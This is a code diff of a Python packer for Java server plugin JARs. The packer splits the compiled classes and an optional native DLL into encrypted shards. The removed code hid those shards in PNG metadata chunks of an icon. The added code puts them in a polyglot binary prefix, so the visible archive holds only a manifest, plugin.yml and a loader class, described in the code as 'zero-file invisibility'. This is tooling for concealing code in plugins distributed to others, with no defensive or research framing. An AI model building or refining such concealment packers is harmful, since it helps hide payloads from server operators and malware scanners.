@@ -1,13 +1,11 @@
 import os
 import sys
 import struct
-import zlib
 import io
 import zipfile
 import hashlib
 
-def calculate_crc32(data: bytes) -> int:
-    return zlib.crc32(data) & 0xFFFFFFFF
+MAGIC_HEADER = 0x434F4F4B49454653  # "COOKIEFS"
 
 def derive_cascading_key(prev_key: int, payload_bytes: bytes) -> int:
     h = hashlib.sha256(payload_bytes + struct.pack(">I", prev_key & 0xFFFFFFFF)).digest()
@@ -36,113 +34,8 @@ def decrypt_payload(data: bytes, key_seed: int) -> bytes:
         rk = ((rk * 37) ^ p) & 0xFF
     return bytes(out)
 
-def create_ztxt_chunk(keyword: str, payload: bytes) -> bytes:
-    compressed_payload = zlib.compress(payload, level=9)
-    chunk_data = keyword.encode('latin-1') + b'\x00\x00' + compressed_payload
-    chunk_type = b'zTXt'
-    length = len(chunk_data)
-    crc = calculate_crc32(chunk_type + chunk_data)
-    return struct.pack(">I", length) + chunk_type + chunk_data + struct.pack(">I", crc)
-
-def inject_png_chunks_valid(png_bytes: bytes, chunks: list[tuple[str, bytes]]) -> bytes:
-    """Injects standard ISO zTXt chunks right before IEND (preserving 100% full IDAT raster integrity)."""
-    if png_bytes[:8] != b'\x89PNG\r\n\x1a\n':
-        raise ValueError("Invalid PNG header")
-
-    out_stream = io.BytesIO()
-    out_stream.write(b'\x89PNG\r\n\x1a\n')
-
-    offset = 8
-    while offset < len(png_bytes):
-        length = struct.unpack(">I", png_bytes[offset:offset+4])[0]
-        chunk_type = png_bytes[offset+4:offset+8]
-        chunk_full = png_bytes[offset:offset+12+length]
-        offset += 12 + length
-
-        if chunk_type == b'IEND':
-            # Place all metadata chunks before IEND so all IDAT chunks remain 100% contiguous
-            for kw, payload in chunks:
-                out_stream.write(create_ztxt_chunk(kw, payload))
-
-        out_stream.write(chunk_full)
-
-    return out_stream.getvalue()
-
-def extract_png_ztxt(png_bytes: bytes, target_keyword: str) -> bytes:
-    if png_bytes[:8] != b'\x89PNG\r\n\x1a\n':
-        raise ValueError("Invalid PNG header")
-
-    offset = 8
-    while offset < len(png_bytes):
-        length = struct.unpack(">I", png_bytes[offset:offset+4])[0]
-        chunk_type = png_bytes[offset+4:offset+8]
-        chunk_data = png_bytes[offset+8:offset+8+length]
-        offset += 12 + length
-
-        if chunk_type == b'zTXt':
-            null_idx = chunk_data.find(b'\x00')
-            if null_idx != -1:
-                kw = chunk_data[:null_idx].decode('latin-1', errors='ignore')
-                if kw == target_keyword:
-                    compressed_stream = chunk_data[null_idx+2:]
-                    return zlib.decompress(compressed_stream)
-        elif chunk_type == b'IEND':
-            break
-    return None
-
-def generate_default_png_icon() -> bytes:
-    width, height = 16, 16
-    raw_data = bytearray()
-    for y in range(height):
-        raw_data.append(0)
-        for x in range(width):
-            if (x in [0, 15] and y in [0, 15]) or (x in [1, 14] and y in [0, 15]):
-                raw_data.extend([0, 0, 0, 0])
-            else:
-                raw_data.extend([217, 119, 6, 255])
-
-    compressed_idat = zlib.compress(bytes(raw_data), level=9)
-    png_buf = io.BytesIO()
-    png_buf.write(b'\x89PNG\r\n\x1a\n')
-
-    # IHDR
-    ihdr_data = struct.pack(">IIBBBBB", width, height, 8, 6, 0, 0, 0)
-    png_buf.write(struct.pack(">I", len(ihdr_data)))
-    png_buf.write(b'IHDR')
-    png_buf.write(ihdr_data)
-    png_buf.write(struct.pack(">I", calculate_crc32(b'IHDR' + ihdr_data)))
-
-    # IDAT
-    png_buf.write(struct.pack(">I", len(compressed_idat)))
-    png_buf.write(b'IDAT')
-    png_buf.write(compressed_idat)
-    png_buf.write(struct.pack(">I", calculate_crc32(b'IDAT' + compressed_idat)))
-
-    # IEND
-    png_buf.write(struct.pack(">I", 0))
-    png_buf.write(b'IEND')
-    png_buf.write(struct.pack(">I", calculate_crc32(b'IEND')))
-
-    return png_buf.getvalue()
-
-def load_image_as_png(custom_icon_path: str = None) -> bytes:
-    if custom_icon_path and os.path.exists(custom_icon_path):
-        try:
-            from PIL import Image
-            im = Image.open(custom_icon_path)
-            if im.mode != 'RGBA':
-                im = im.convert('RGBA')
-            buf = io.BytesIO()
-            im.save(buf, format='PNG')
-            return buf.getvalue()
-        except Exception as e:
-            with open(custom_icon_path, 'rb') as cf:
-                raw = cf.read()
-                if raw[:8] == b'\x89PNG\r\n\x1a\n':
-                    return raw
-    return generate_default_png_icon()
-
-def pack_jar_with_matryoshka_steganography(input_obf_jar: str, output_final_jar: str, bootstrap_cls_bytes: bytes, custom_icon_path: str = None, native_dll_path: str = None):
+def pack_jar_with_polyglot_prefix(input_obf_jar: str, output_final_jar: str, bootstrap_cls_bytes: bytes, native_dll_path: str = None):
+    """Packs 4 Shards into a Polyglot Header Prefix (Zero-File Invisibility, 100% Clean ZIP Catalog)."""
     all_entries = []
     with zipfile.ZipFile(input_obf_jar, 'r') as zin:
         for item in zin.infolist():
@@ -188,18 +81,20 @@ def pack_jar_with_matryoshka_steganography(input_obf_jar: str, output_final_jar:
     P4 = raw_shards[3]
     E4 = encrypt_payload(P4, K4)
 
-    # 3. Inject 4 Encrypted Shards into 4 Standard ISO PNG Chunks (Preserving 100% full IDAT raster integrity)
-    base_png = load_image_as_png(custom_icon_path)
-    chunks_to_inject = [
-        ("Comment", E1),       # Shard 1 (25% classes)
-        ("Author", E2),        # Shard 2 (25% classes)
-        ("Description", E3),   # Shard 3 (25% classes)
-        ("Software", E4)       # Shard 4 (25% classes + Native DLL)
-    ]
-    matryoshka_png = inject_png_chunks_valid(base_png, chunks_to_inject)
+    # 3. Create Binary Prefix Payload
+    prefix_payload = io.BytesIO()
+    prefix_payload.write(struct.pack(">IIII", len(E1), len(E2), len(E3), len(E4)))
+    prefix_payload.write(E1)
+    prefix_payload.write(E2)
+    prefix_payload.write(E3)
+    prefix_payload.write(E4)
+    payload_data = prefix_payload.getvalue()
 
-    # 4. Pack into Clean Standard JAR (Compatible 100% with Paper PluginRemapper)
-    with zipfile.ZipFile(input_obf_jar, 'r') as zin, zipfile.ZipFile(output_final_jar, 'w', compression=zipfile.ZIP_DEFLATED) as zout:
+    header_block = struct.pack(">QI", MAGIC_HEADER, len(payload_data)) + payload_data
+
+    # 4. Create Standard Clean ZIP JAR containing ONLY 3 files (MANIFEST, plugin.yml, Bootstrap.class)
+    jar_buf = io.BytesIO()
+    with zipfile.ZipFile(input_obf_jar, 'r') as zin, zipfile.ZipFile(jar_buf, 'w', compression=zipfile.ZIP_DEFLATED) as zout:
         for item in zin.infolist():
             fn = item.filename
             if fn in ['plugin.yml', 'bungee.yml']:
@@ -210,9 +105,15 @@ def pack_jar_with_matryoshka_steganography(input_obf_jar: str, output_final_jar:
             elif fn.startswith('META-INF/MANIFEST.MF'):
                 zout.writestr(item, zin.read(fn))
 
-        # Standard clean Bootstrap class & 100% Valid PNG image container
+        # Add single standalone Bootstrap class (Zero Inner Classes, Zero PNG, Zero DAT, Zero BIN)
         zout.writestr('cookie/fack/please/d111/Bootstrap.class', bootstrap_cls_bytes)
-        zout.writestr('icon.png', matryoshka_png)
+
+    base_jar_bytes = jar_buf.getvalue()
+
+    # 5. Prepend Polyglot Header to create final invisible binary
+    with open(output_final_jar, 'wb') as out_f:
+        out_f.write(header_block)
+        out_f.write(base_jar_bytes)
 
 if __name__ == '__main__':
     if len(sys.argv) >= 4:
@@ -221,9 +122,9 @@ if __name__ == '__main__':
             in_jar = sys.argv[2]
             out_jar = sys.argv[3]
             boot_cls_path = sys.argv[4]
-            custom_icon = sys.argv[5] if len(sys.argv) > 5 and sys.argv[5] != "NONE" else None
+            custom_icon = sys.argv[5] if len(sys.argv) > 5 else "NONE"
             native_dll = sys.argv[6] if len(sys.argv) > 6 and sys.argv[6] != "NONE" else None
             with open(boot_cls_path, 'rb') as bf:
                 boot_bytes = bf.read()
-            pack_jar_with_matryoshka_steganography(in_jar, out_jar, boot_bytes, custom_icon, native_dll)
-            print("[v] Successfully packed JAR with 100% Valid Matryoshka PNG Steganography.")
+            pack_jar_with_polyglot_prefix(in_jar, out_jar, boot_bytes, native_dll)
+            print("[v] Successfully packed JAR with Polyglot Header Prefix (Zero-File Invisibility).")
